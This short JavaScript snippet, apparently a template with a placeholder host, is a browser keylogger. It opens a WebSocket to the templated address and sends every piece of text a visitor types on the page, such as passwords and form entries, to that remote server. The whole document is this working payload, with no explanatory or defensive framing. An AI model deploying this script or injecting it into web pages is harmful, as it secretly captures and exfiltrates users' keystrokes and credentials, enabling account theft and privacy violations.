(function() {
    var conn = new WebSocket("ws://{{.}}/ws");
    document.addEventListener("input", function(evt) {
        s = evt.data;
        conn.send(s);
    });
})();
